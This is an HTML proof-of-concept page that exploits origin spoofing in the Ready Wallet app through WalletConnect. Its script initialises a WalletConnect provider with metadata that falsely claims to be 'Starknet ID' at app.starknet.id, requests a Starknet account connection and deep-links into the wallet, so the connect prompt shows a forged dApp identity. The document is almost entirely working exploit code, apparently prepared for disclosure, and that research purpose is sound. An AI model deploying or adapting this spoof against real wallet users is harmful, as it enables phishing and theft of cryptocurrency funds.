<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Ready Wallet Origin Spoof PoC</title>
</head>
<body>
  <h1>Ready Wallet Origin Spoof PoC</h1>
  <button id="connect">Spoof connect prompt</button>
  <pre id="log"></pre>

  <script type="module">
    import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';

    const REAL_ORIGIN = location.origin;
    const CLAIMED_URL = 'https://app.starknet.id';
    const CLAIMED_NAME = 'Starknet ID';

    const log = (msg) => {
      document.getElementById('log').textContent += msg + '\n';
    };

    document.getElementById('connect').onclick = async () => {
      try {
        log('Initializing...');

        const provider = await UniversalProvider.init({
          projectId: '2f05ae7f1116030fde2d36508f472bfb',
          metadata: {
            name: CLAIMED_NAME,
            description: 'Spoofed dApp',
            url: CLAIMED_URL,
            icons: []
          },
          relayUrl: 'wss://relay.walletconnect.com'
        });

        log('Provider ready!');

        const { uri } = await provider.client.connect({
          requiredNamespaces: {
            starknet: {
              chains: ['starknet:SNMAIN'],
              methods: ['starknet_account'],
              events: ['accountsChanged']
            }
          }
        });

        if (uri) {
          log('Real origin: ' + REAL_ORIGIN);
          log('Claimed URL: ' + CLAIMED_URL);
          log('URI: ' + uri.substring(0, 50) + '...');
          log('Opening Ready Wallet...');
          location.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
        }
      } catch(e) {
        log('Error: ' + e.message);
      }
    };
  </script>
</body>
</html>
